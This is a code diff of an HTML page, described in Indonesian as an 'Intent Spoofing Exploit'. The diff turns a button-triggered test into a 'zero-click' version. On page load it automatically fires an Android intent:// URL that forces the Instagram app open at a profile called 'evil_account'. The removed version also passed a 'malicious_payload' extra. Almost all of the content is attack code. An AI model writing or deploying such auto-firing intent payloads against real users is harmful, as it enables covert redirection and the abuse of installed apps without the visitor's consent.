@@ -3,15 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Intent Spoofing Exploit</title>
+<title>Zero-Click Intent Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
 .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
 h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
 p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
-button:hover { background: #b71c1c; }
 #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
 .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
 </style>
@@ -19,15 +17,13 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>Intent Spoofing Exploit</h1>
-    <p>Mengirimkan argumen palsu (Extra) ke aplikasi Instagram via Intent Scheme.</p>
-    <button id="start-btn" type="button">Mulai Intent Spoofing</button>
-    <div id="status" role="status">Sistem siap.</div>
+    <h1>Zero-Click Intent Spoofing</h1>
+    <p>Mengarahkan Anda ke profil Instagram target secara otomatis saat halaman dimuat.</p>
+    <div id="status" role="status">Memuat halaman...</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
 </div>
 
 <script>
-    const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
     const logDiv = document.getElementById("log");
 
@@ -36,32 +32,26 @@ button:hover { background: #b71c1c; }
         console.log(msg);
     }
 
-    startBtn.addEventListener("click", () => {
+    // FUNGSI ZERO-CLICK: Langsung eksekusi saat DOM siap
+    window.addEventListener("DOMContentLoaded", () => {
         statusDiv.textContent = "Memicu Intent Spoofing...";
-        startBtn.disabled = true;
-
-        // 1. Intent Spoofing ke Instagram
-        // Kita mencoba mengirim URL dengan parameter tambahan yang tidak valid
-        // atau memaksa Instagram membuka halaman tertentu dengan extra data.
         
         try {
-            // Contoh manipulasi: Mengirim URL yang sangat panjang atau parameter palsu
-            const spoofedUrl = "intent://instagram.com/_u/evil_account/#Intent;scheme=https;package=com.instagram.android;S.extra_data=malicious_payload;S.browser_fallback_url=https://google.com;end";
+            // URL Intent Spoofing (Mengarah ke profil evil_account)
+            const spoofedUrl = "intent://instagram.com/_u/evil_account/#Intent;scheme=https;package=com.instagram.android;end";
             
-            log("Memicu Intent Spoofing Instagram...");
+            log("Memicu Intent: " + spoofedUrl);
+            
+            // Eksekusi navigasi secara instan
             window.location.href = spoofedUrl;
             
-            statusDiv.textContent = "Intent Spoofing dipicu. Cek apakah Instagram terbuka dengan anomali.";
+            statusDiv.textContent = "Intent dipicu. Cek apakah Instagram terbuka.";
             statusDiv.style.color = "#4CAF50";
         } catch (e) {
             log("Gagal memicu Intent: " + e.message);
             statusDiv.textContent = "Gagal: " + e.message;
             statusDiv.style.color = "#f00";
         }
-
-        setTimeout(() => {
-            startBtn.disabled = false;
-        }, 2000);
     });
 </script>
 </body>
